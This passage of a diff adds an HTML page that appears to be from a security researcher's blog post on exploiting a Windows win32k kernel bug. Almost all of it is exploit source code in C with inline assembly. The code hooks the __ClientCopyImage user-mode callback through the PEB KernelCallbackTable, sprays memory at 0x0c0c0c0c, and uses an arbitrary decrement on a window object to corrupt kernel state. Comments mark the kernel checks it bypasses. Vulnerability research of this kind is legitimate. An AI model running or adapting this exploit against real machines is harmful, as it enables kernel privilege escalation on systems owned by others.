+    <span class="n">RtlInitLargeUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">plstr</span><span class="p">,</span> <span class="p">(</span><span class="n">WCHAR</span> <span class="o">*</span><span class="p">)</span><span class="n">originalCLS</span><span class="p">,</span> <span class="p">(</span><span class="n">UINT</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">NtUserDefSetText</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="n">SecondWindowIndex</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">plstr</span><span class="p">);</span>
+    <span class="n">SecondWindowIndex</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">g_originalCCI</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">Get__ClientCopyImageAddressInPEB</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+	<span class="n">mov</span> <span class="n">edx</span> <span class="p">,</span> <span class="mh">0xD8</span><span class="p">;</span> <span class="c1">// 0x36 *4 -&gt;  API index *4  number  for  __ClientCopyImage</span>
+	<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mx">00000018h</span><span class="p">]</span> <span class="c1">// eax=TEB</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mx">30h</span><span class="p">]</span> <span class="c1">// EAX=PEB</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">2</span><span class="n">Ch</span><span class="p">]</span> <span class="c1">// EAX=KernelCallbackTable</span>
+	<span class="n">add</span>	  <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
+	<span class="n">mov</span>	  <span class="n">address</span><span class="p">,</span><span class="n">eax</span><span class="p">;</span>
+		<span class="c1">//  int 3</span>
+
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">address</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">init</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">prot</span><span class="p">;</span>
+
+    <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">);</span>
+    <span class="n">CreateSecondWindow</span><span class="p">();</span>
+
+    <span class="kt">void</span> <span class="o">*</span><span class="n">lpvBase</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
+        <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0c0c0c0c</span><span class="p">,</span>       <span class="c1">// System selects address</span>
+        <span class="mi">2048</span><span class="p">,</span>                     <span class="c1">// Size of allocation</span>
+        <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="c1">// Allocate reserved pages</span>
+        <span class="n">PAGE_READWRITE</span><span class="p">);</span>          <span class="c1">// Protection = no access</span>
+
+    <span class="cm">/*
+    for safe exit  : i used trick like  Browser Fake vTable :
+    allocate 0x0c0c0c0c address and  fill tagWND with 0x0c0c0c0c
+    so every dereference  will loop in 0x0c0c0c0c
+
+    */</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">lpvBase</span><span class="p">,</span> <span class="sc">'\x0c'</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">originalCLS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">originalCLS</span><span class="p">,</span> <span class="sc">'\x0c'</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">);</span>
+
+    <span class="cm">/*
+   +0x014 bForceMenuDraw   : Pos 15, 1 Bit
+   +0x014 bDialogWindow    : Pos 16, 1 Bit
+   +0x014 bHasCreatestructName : Pos 17, 1 Bit
+   +0x014 bServerSideWindowProc : Pos 18, 1 Bit
+   +0x014 bAnsiWindowProc  : Pos 19, 1 Bit
+   */</span>
+
+    <span class="n">kernelHandle</span> <span class="o">=</span> <span class="n">GetKernelHandle</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="n">ArbDecByOne</span><span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">kernelHandle</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span> <span class="c1">//</span>
+
+    <span class="n">__ClientCopyImageAddress</span> <span class="o">=</span> <span class="n">Get__ClientCopyImageAddressInPEB</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"address of __ClientCopyImage is %x </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__ClientCopyImageAddress</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">__ClientCopyImageAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prot</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">g_originalCCI</span> <span class="o">=</span> <span class="p">(</span><span class="n">pUser32_ClientCopyImage</span><span class="p">)</span><span class="n">InterlockedExchangePointer</span><span class="p">(</span><span class="n">__ClientCopyImageAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hookCCI</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">WNDCLASSEX</span> <span class="n">wc</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
+    <span class="n">MSG</span> <span class="n">Msg</span><span class="p">;</span>
+
+    <span class="c1">// Step 1: Registering the Window Class</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEX</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">style</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">WndProc</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbClsExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIcon</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>   <span class="c1">// bypass  check  inside xxxSetClassIcon to lead  execution path to callback</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hCursor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// bypass  check  inside xxxSetClassIcon to lead  execution path to callback</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hbrBackground</span> <span class="o">=</span> <span class="p">(</span><span class="n">HBRUSH</span><span class="p">)(</span><span class="n">COLOR_WINDOW</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszMenuName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="n">g_szClassName</span><span class="p">;</span>
+    <span class="n">wc</span><span class="p">.</span><span class="n">hIconSm</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// bypass  "if" inside xxxSetClassIcon to lead  execution  path to callback</span>
+
+    <span class="n">init</span><span class="p">();</span>
+
+    <span class="cm">/*
+
+
+        .text:BF91B33C                 mov     edi, [ebp+pclsBase]
+        ..............
+        ..............
+        .text:BF91B346                 mov     eax, [edi+58h]
+        .text:BF91B349                 cmp     eax, [ebp+arg_8] ; new and  old  icon must be  diffrent
+        .text:BF91B34C                 jz      loc_BF91B42C     -----------&gt;&gt;&gt; we  need bypass this
+        ..............
+        ..............
+        .text:BF91B396 loc_BF91B396:                           ; CODE XREF: xxxSetClassIcon(x,x,x,x)+68j
+        .text:BF91B396                 lea     esi, [edi+58h]  ;  EDI
+        .text:BF91B399                 mov     ecx, esi
+        .text:BF91B39B                 mov     edx, [ebp+arg_8]
+        .text:BF91B39E                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)
+        .text:BF91B3A3                 cmp     dword ptr [edi+44h], 0
+        .text:BF91B3A7                 jz      short loc_BF91B3B4  ----------&gt;&gt;&gt; we  need  bypass this
+        .text:BF91B3A9                 cmp     dword ptr [esi], 0
+        .text:BF91B3AC                 jnz     short loc_BF91B3B4  ----------&gt;&gt;&gt; we  need  bypass this
+        .text:BF91B3AE                 push    edi
+        .text:BF91B3AF                 call    _xxxCreateClassSmIcon@4 ; xxxCreateClassSmIcon(x)
+
+    */</span>
+
+    <span class="k">do</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegisterClassExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wc</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Step 2: Creating the Window</span>
+        <span class="n">hwnd</span> <span class="o">=</span> <span class="n">CreateWindowEx</span><span class="p">(</span>
+            <span class="n">WS_EX_CLIENTEDGE</span><span class="p">,</span>
+            <span class="n">g_szClassName</span><span class="p">,</span>
+            <span class="s">L"The title of my window"</span><span class="p">,</span>
+            <span class="n">WS_OVERLAPPEDWINDOW</span><span class="p">,</span>
+            <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">hwnd</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">ShowWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">UpdateWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
+        <span class="c1">// Triger UserMode CallBack</span>
+        <span class="n">SetClassLongPtr</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">GCLP_HICON</span><span class="p">,</span> <span class="p">(</span><span class="n">LONG_PTR</span><span class="p">)</span><span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">));</span>
+
+        <span class="n">SendMessageW</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">WM_NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+
+  </div><a class="u-url" href="/fuzzing/2024/04/01/explitingwind32k.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">My interesting researches</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">My interesting researches</li><li><a class="u-email" href="mailto:firozimaysam at gmail.com">firozimaysam at gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/R00tkitSMM"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">R00tkitSMM</span></a></li><li><a href="https://www.twitter.com/R00tkitSMM"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">R00tkitSMM</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>I share what I find interesting here..</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
